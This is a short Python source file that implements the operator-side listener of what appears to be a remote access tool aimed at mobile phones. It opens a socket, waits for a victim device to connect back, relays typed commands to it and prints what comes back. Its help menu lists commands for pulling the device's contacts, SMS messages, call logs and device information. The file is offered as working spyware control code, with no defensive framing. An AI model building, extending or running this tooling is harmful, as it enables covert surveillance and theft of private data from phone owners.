import socket,sys,os
from colorama import Fore

class Listener:
    def __init__(self,host,port) -> None:
        self.host = host
        self.port = port
        
        self.sockConnection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sockConnection.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.sockConnection.bind((self.host,self.port))
        self.sockConnection.listen(0)

    def receiver(self,connection):
        response = connection.recv(1024)
        print(response.decode())



    def listener(self):
        
        print(f"[+] Listening on host : {self.host} @ port : {self.port}")
        sock_connection, sock_address = self.sockConnection.accept()
        print(f"[+] Got a connection from {sock_address[0]} @ Port {sock_address[1]}\n")
        
        while True:
            try:
                command = input(f"[{Fore.RED}{self.host}{Fore.RESET}] >> ").encode('utf-8')
                if(command.decode("utf-8") == "exit"):
                    self.sockConnection.close()
                    sys.exit()
                elif(command.decode("utf-8") == "help"):
                    Help().showListenerHelp()
                elif(command.decode('utf-8')=="cls"):
                    os.system("cls")
                else:
                    sock_connection.sendall(command)
                    self.receiver(sock_connection)
            except ConnectionResetError:
                print("[X] user disconnected")


class Help:
    def __init__(self) -> None:
        pass

    def showListenerHelp(self):
        print("""
        COMMAND                 DESCRIPTION
       -----------               -----------------
        con             -       show contacts
        sms             -       show messages
        info            -       show info about device
        logs            -       show calllogs
""")
